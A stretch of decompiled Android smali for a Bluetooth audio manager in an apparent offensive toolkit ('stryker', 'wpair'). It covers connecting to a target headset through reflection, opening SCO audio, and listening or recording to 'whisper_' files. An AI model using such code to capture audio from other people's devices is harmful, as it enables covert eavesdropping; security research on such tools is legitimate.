    invoke-interface {p2, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    .line 139
    .line 140
    .line 141
    goto :goto_3

    .line 142
    :catch_3
    new-instance p1, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    .line 143
    .line 144
    invoke-direct {p1, v0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    .line 145
    .line 146
    .line 147
    goto :goto_0

    .line 148
    :goto_1
    invoke-virtual {p1}, Ljava/lang/reflect/InvocationTargetException;->getCause()Ljava/lang/Throwable;

    .line 149
    .line 150
    .line 151
    move-result-object p1

    .line 152
    instance-of v2, p1, Ljava/lang/SecurityException;

    .line 153
    .line 154
    if-eqz v2, :cond_4

    .line 155
    .line 156
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 157
    .line 158
    .line 159
    move-result-object v2

    .line 160
    if-eqz v2, :cond_4

    .line 161
    .line 162
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 163
    .line 164
    .line 165
    move-result-object p1

    .line 166
    const-string v2, "MODIFY_PHONE_STATE"

    .line 167
    .line 168
    invoke-virtual {p1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    .line 169
    .line 170
    .line 171
    move-result p1

    .line 172
    if-eqz p1, :cond_4

    .line 173
    .line 174
    new-instance p1, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    .line 175
    .line 176
    invoke-direct {p1, v0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    .line 177
    .line 178
    .line 179
    goto :goto_0

    .line 180
    :cond_4
    new-instance p1, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    .line 181
    .line 182
    invoke-direct {p1, v1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 183
    .line 184
    .line 185
    goto :goto_0

    .line 186
    :goto_2
    const-string v0, "WpairAudio"

    .line 187
    .line 188
    const-string v1, "connect failed"

    .line 189
    .line 190
    invoke-static {v0, v1, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 191
    .line 192
    .line 193
    new-instance v0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    .line 194
    .line 195
    new-instance v1, Ljava/lang/StringBuilder;

    .line 196
    .line 197
    const-string v2, "Connection error: "

    .line 198
    .line 199
    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 200
    .line 201
    .line 202
    invoke-static {p1, v1}, Ll1/e;->c(Ljava/lang/Exception;Ljava/lang/StringBuilder;)Ljava/lang/String;

    .line 203
    .line 204
    .line 205
    move-result-object p1

    .line 206
    invoke-direct {v0, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    .line 207
    .line 208
    .line 209
    invoke-interface {p2, v0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    .line 210
    .line 211
    .line 212
    :goto_3
    return-void

    .line 213
    :cond_5
    :goto_4
    new-instance p1, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    .line 214
    .line 215
    const-string v0, "Bluetooth not available"

    .line 216
    .line 217
    invoke-direct {p1, v0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    .line 218
    .line 219
    .line 220
    invoke-interface {p2, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    .line 221
    .line 222
    .line 223
    return-void
.end method

.method public disconnect()V
    .locals 8
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "MissingPermission"
        }
    .end annotation

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->isRecording:Z

    iput-boolean v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->isListening:Z

    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->safeStopRecording()V

    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->safeStopListening()V

    iget-object v1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioManager:Landroid/media/AudioManager;

    const-string v2, "WpairAudio"

    if-eqz v1, :cond_1

    :try_start_0
    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x1f

    if-lt v3, v4, :cond_0

    invoke-static {v1}, Landroidx/core/view/d;->j(Landroid/media/AudioManager;)V

    goto :goto_0

    :catch_0
    move-exception v1

    goto :goto_1

    :cond_0
    invoke-virtual {v1}, Landroid/media/AudioManager;->stopBluetoothSco()V

    invoke-virtual {v1, v0}, Landroid/media/AudioManager;->setBluetoothScoOn(Z)V

    :goto_0
    invoke-virtual {v1, v0}, Landroid/media/AudioManager;->setMode(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :goto_1
    const-string v3, "stop SCO"

    invoke-static {v2, v3, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_1
    :goto_2
    iget-object v1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->headsetProfile:Landroid/bluetooth/BluetoothHeadset;

    iget-object v3, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->targetDevice:Landroid/bluetooth/BluetoothDevice;

    if-eqz v1, :cond_2

    if-eqz v3, :cond_2

    :try_start_1
    const-class v4, Landroid/bluetooth/BluetoothHeadset;

    const-string v5, "disconnect"

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/Class;

    const-class v7, Landroid/bluetooth/BluetoothDevice;

    aput-object v7, v6, v0

    invoke-virtual {v4, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    filled-new-array {v3}, [Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v0, v1, v3}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_3

    :catch_1
    move-exception v0

    const-string v1, "HFP disconnect"

    invoke-static {v2, v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_2
    :goto_3
    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->unregisterScoReceiver()V

    iget-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->stateCallback:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;

    if-eqz v0, :cond_3

    :try_start_2
    sget-object v1, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Disconnected;->INSTANCE:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Disconnected;

    invoke-interface {v0, v1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    :cond_3
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->stateCallback:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;

    iput-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->recordingCallback:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$RecordingCallback;

    iput-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->targetDevice:Landroid/bluetooth/BluetoothDevice;

    return-void
.end method

.method public getConnectedDevices()Ljava/util/List;
    .locals 1
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "MissingPermission"
        }
    .end annotation

    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/List<",
            "Landroid/bluetooth/BluetoothDevice;",
            ">;"
        }
    .end annotation

    :try_start_0
    iget-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->headsetProfile:Landroid/bluetooth/BluetoothHeadset;

    if-nez v0, :cond_0

    invoke-static {}, Ljava/util/Collections;->emptyList()Ljava/util/List;

    move-result-object v0

    goto :goto_0

    :cond_0
    invoke-virtual {v0}, Landroid/bluetooth/BluetoothHeadset;->getConnectedDevices()Ljava/util/List;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-object v0

    :catch_0
    invoke-static {}, Ljava/util/Collections;->emptyList()Ljava/util/List;

    move-result-object v0

    return-object v0
.end method

.method public initialize(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$ReadyCallback;)V
    .locals 5
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "MissingPermission"
        }
    .end annotation

    const/4 v0, 0x0

    :try_start_0
    iget-object v1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->context:Landroid/content/Context;

    const-string v2, "audio"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/media/AudioManager;

    iput-object v1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioManager:Landroid/media/AudioManager;

    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->adapter()Landroid/bluetooth/BluetoothAdapter;

    move-result-object v1

    if-nez v1, :cond_0

    invoke-interface {p1, v0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$ReadyCallback;->onReady(Z)V

    return-void

    :catch_0
    move-exception v1

    goto :goto_0

    :cond_0
    new-instance v2, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$1;

    invoke-direct {v2, p0, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$1;-><init>(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$ReadyCallback;)V

    iput-object v2, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->profileListener:Landroid/bluetooth/BluetoothProfile$ServiceListener;

    iget-object v3, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->context:Landroid/content/Context;

    const/4 v4, 0x1

    invoke-virtual {v1, v3, v2, v4}, Landroid/bluetooth/BluetoothAdapter;->getProfileProxy(Landroid/content/Context;Landroid/bluetooth/BluetoothProfile$ServiceListener;I)Z

    iget-object v2, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->context:Landroid/content/Context;

    iget-object v3, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->profileListener:Landroid/bluetooth/BluetoothProfile$ServiceListener;

    const/4 v4, 0x2

    invoke-virtual {v1, v2, v3, v4}, Landroid/bluetooth/BluetoothAdapter;->getProfileProxy(Landroid/content/Context;Landroid/bluetooth/BluetoothProfile$ServiceListener;I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :goto_0
    const-string v2, "WpairAudio"

    const-string v3, "init failed"

    invoke-static {v2, v3, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    invoke-interface {p1, v0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$ReadyCallback;->onReady(Z)V

    :goto_1
    return-void
.end method

.method public isHfpConnected(Ljava/lang/String;)Z
    .locals 3
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "MissingPermission"
        }
    .end annotation

    const/4 v0, 0x0

    :try_start_0
    iget-object v1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->headsetProfile:Landroid/bluetooth/BluetoothHeadset;

    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->adapter()Landroid/bluetooth/BluetoothAdapter;

    move-result-object v2

    if-eqz v1, :cond_1

    if-nez v2, :cond_0

    goto :goto_0

    :cond_0
    invoke-virtual {v1}, Landroid/bluetooth/BluetoothHeadset;->getConnectedDevices()Ljava/util/List;

    move-result-object v1

    invoke-virtual {v2, p1}, Landroid/bluetooth/BluetoothAdapter;->getRemoteDevice(Ljava/lang/String;)Landroid/bluetooth/BluetoothDevice;

    move-result-object p1

    invoke-interface {v1, p1}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return p1

    :catch_0
    :cond_1
    :goto_0
    return v0
.end method

.method public release()V
    .locals 3
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "MissingPermission"
        }
    .end annotation

    :try_start_0
    invoke-virtual {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->disconnect()V

    iget-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->headsetProfile:Landroid/bluetooth/BluetoothHeadset;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    if-eqz v0, :cond_0

    :try_start_1
    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->adapter()Landroid/bluetooth/BluetoothAdapter;

    move-result-object v0

    iget-object v1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->headsetProfile:Landroid/bluetooth/BluetoothHeadset;

    const/4 v2, 0x1

    invoke-virtual {v0, v2, v1}, Landroid/bluetooth/BluetoothAdapter;->closeProfileProxy(ILandroid/bluetooth/BluetoothProfile;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    :cond_0
    :try_start_2
    iget-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->a2dpProfile:Landroid/bluetooth/BluetoothA2dp;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    if-eqz v0, :cond_1

    :try_start_3
    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->adapter()Landroid/bluetooth/BluetoothAdapter;

    move-result-object v0

    iget-object v1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->a2dpProfile:Landroid/bluetooth/BluetoothA2dp;

    const/4 v2, 0x2

    invoke-virtual {v0, v2, v1}, Landroid/bluetooth/BluetoothAdapter;->closeProfileProxy(ILandroid/bluetooth/BluetoothProfile;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :catch_1
    :cond_1
    const/4 v0, 0x0

    :try_start_4
    iput-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->headsetProfile:Landroid/bluetooth/BluetoothHeadset;

    iput-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->a2dpProfile:Landroid/bluetooth/BluetoothA2dp;

    iput-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->profileListener:Landroid/bluetooth/BluetoothProfile$ServiceListener;

    iput-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioManager:Landroid/media/AudioManager;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    goto :goto_0

    :catch_2
    move-exception v0

    const-string v1, "WpairAudio"

    const-string v2, "release"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method public startListening(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;)V
    .locals 4
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "MissingPermission"
        }
    .end annotation

    .line 1
    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->safeStopRecording()V

    .line 2
    .line 3
    .line 4
    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->safeStopListening()V

    .line 5
    .line 6
    .line 7
    iput-object p1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->stateCallback:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;

    .line 8
    .line 9
    iget-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioManager:Landroid/media/AudioManager;

    .line 10
    .line 11
    if-nez v0, :cond_0

    .line 12
    .line 13
    new-instance v0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    .line 14
    .line 15
    const-string v1, "AudioManager not available"

    .line 16
    .line 17
    invoke-direct {v0, v1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    .line 18
    .line 19
    .line 20
    invoke-interface {p1, v0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    .line 21
    .line 22
    .line 23
    return-void

    .line 24
    :cond_0
    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->registerScoReceiver()V

    .line 25
    .line 26
    .line 27
    const/4 v1, 0x3

    .line 28
    :try_start_0
    invoke-virtual {v0, v1}, Landroid/media/AudioManager;->setMode(I)V

    .line 29
    .line 30
    .line 31
    invoke-direct {p0, v0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->startSco(Landroid/media/AudioManager;)V

    .line 32
    .line 33
    .line 34
    iget-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->handler:Landroid/os/Handler;

    .line 35
    .line 36
    new-instance v1, Lcom/zalexdev/stryker/wpair/e;

    .line 37
    .line 38
    const/4 v2, 0x4

    .line 39
    invoke-direct {v1, p0, p1, v2}, Lcom/zalexdev/stryker/wpair/e;-><init>(Ljava/lang/Object;Ljava/lang/Object;I)V

    .line 40
    .line 41
    .line 42
    const-wide/16 v2, 0x3e8

    .line 43
    .line 44
    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 45
    .line 46
    .line 47
    goto :goto_0

    .line 48
    :catch_0
    move-exception v0

    .line 49
    const-string v1, "WpairAudio"

    .line 50
    .line 51
    const-string v2, "listen start failed"

    .line 52
    .line 53
    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 54
    .line 55
    .line 56
    new-instance v1, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    .line 57
    .line 58
    new-instance v2, Ljava/lang/StringBuilder;

    .line 59
    .line 60
    const-string v3, "Listen error: "

    .line 61
    .line 62
    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 63
    .line 64
    .line 65
    invoke-static {v0, v2}, Ll1/e;->c(Ljava/lang/Exception;Ljava/lang/StringBuilder;)Ljava/lang/String;

    .line 66
    .line 67
    .line 68
    move-result-object v0

    .line 69
    invoke-direct {v1, v0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    .line 70
    .line 71
    .line 72
    invoke-interface {p1, v1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    .line 73
    .line 74
    .line 75
    :goto_0
    return-void
.end method

.method public startRecording(Ljava/io/File;Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$RecordingCallback;)V
    .locals 7
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "MissingPermission"
        }
    .end annotation

    .line 1
    const-string v0, "whisper_"

    .line 2
    .line 3
    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->safeStopRecording()V

    .line 4
    .line 5
    .line 6
    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->safeStopListening()V

    .line 7
    .line 8
    .line 9
    iput-object p2, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->stateCallback:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;

    .line 10
    .line 11
    iput-object p3, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->recordingCallback:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$RecordingCallback;

    .line 12
    .line 13
    iget-object p3, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioManager:Landroid/media/AudioManager;

    .line 14
    .line 15
    if-nez p3, :cond_0

    .line 16
    .line 17
    new-instance p1, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    .line 18
    .line 19
    const-string p3, "AudioManager not available"

    .line 20
    .line 21
    invoke-direct {p1, p3}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    .line 22
    .line 23
    .line 24
    invoke-interface {p2, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    .line 25
    .line 26
    .line 27
    return-void

    .line 28
    :cond_0
    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->registerScoReceiver()V

    .line 29
    .line 30
    .line 31
    const/4 v1, 0x3

    .line 32
    :try_start_0
    invoke-virtual {p3, v1}, Landroid/media/AudioManager;->setMode(I)V

    .line 33
    .line 34
    .line 35
    invoke-direct {p0, p3}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->startSco(Landroid/media/AudioManager;)V

    .line 36
    .line 37
    .line 38
    new-instance p3, Ljava/text/SimpleDateFormat;

    .line 39
    .line 40
    const-string v1, "yyyyMMdd_HHmmss"

    .line 41
    .line 42
    sget-object v2, Ljava/util/Locale;->US:Ljava/util/Locale;

    .line 43
    .line 44
    invoke-direct {p3, v1, v2}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;Ljava/util/Locale;)V

    .line 45
    .line 46
    .line 47
    new-instance v1, Ljava/util/Date;

    .line 48
    .line 49
    invoke-direct {v1}, Ljava/util/Date;-><init>()V

    .line 50
    .line 51
    .line 52
    invoke-virtual {p3, v1}, Ljava/text/DateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    .line 53
    .line 54
    .line 55
    move-result-object p3

    .line 56
    new-instance v3, Ljava/io/File;

    .line 57
    .line 58
    new-instance v1, Ljava/lang/StringBuilder;

    .line 59
    .line 60
    invoke-direct {v1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 61
    .line 62
    .line 63
    invoke-virtual {v1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 64
    .line 65
    .line 66
    const-string v2, ".pcm"

    .line 67
    .line 68
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 69
    .line 70
    .line 71
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 72
    .line 73
    .line 74
    move-result-object v1

    .line 75
    invoke-direct {v3, p1, v1}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 76
    .line 77
    .line 78
    new-instance v4, Ljava/io/File;

    .line 79
    .line 80
    new-instance v1, Ljava/lang/StringBuilder;

    .line 81
    .line 82
    invoke-direct {v1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 83
    .line 84
    .line 85
    invoke-virtual {v1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 86
    .line 87
    .line 88
    const-string p3, ".m4a"

    .line 89
    .line 90
    invoke-virtual {v1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 91
    .line 92
    .line 93
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 94
    .line 95
    .line 96
    move-result-object p3

    .line 97
    invoke-direct {v4, p1, p3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 98
    .line 99
    .line 100
    iget-object p1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->handler:Landroid/os/Handler;

    .line 101
    .line 102
    new-instance p3, Lj2/b;

    .line 103
    .line 104
    const/16 v6, 0xc

    .line 105
    .line 106
    move-object v1, p3

    .line 107
    move-object v2, p0

    .line 108
    move-object v5, p2

    .line 109
    invoke-direct/range {v1 .. v6}, Lj2/b;-><init>(Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;Ljava/lang/Object;I)V

    .line 110
    .line 111
    .line 112
    const-wide/16 v0, 0x3e8

    .line 113
    .line 114
    invoke-virtual {p1, p3, v0, v1}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 115
    .line 116
    .line 117
    goto :goto_0

    .line 118
    :catch_0
    move-exception p1

    .line 119
    const-string p3, "WpairAudio"

    .line 120
    .line 121
    const-string v0, "SCO start failed"

    .line 122
    .line 123
    invoke-static {p3, v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 124
    .line 125
    .line 126
    new-instance p3, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    .line 127
    .line 128
    new-instance v0, Ljava/lang/StringBuilder;

    .line 129
    .line 130
    const-string v1, "SCO error: "

    .line 131
    .line 132
    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 133
    .line 134
    .line 135
    invoke-static {p1, v0}, Ll1/e;->c(Ljava/lang/Exception;Ljava/lang/StringBuilder;)Ljava/lang/String;

    .line 136
    .line 137
    .line 138
    move-result-object p1

    .line 139
    invoke-direct {p3, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    .line 140
    .line 141
    .line 142
    invoke-interface {p2, p3}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    .line 143
    .line 144
    .line 145
    :goto_0
    return-void
.end method

.method public stopListening()V
    .locals 1

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->isListening:Z

    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->safeStopListening()V

    return-void
.end method

.method public stopRecording()V
    .locals 1

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->isRecording:Z

    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->safeStopRecording()V

    return-void
.end method
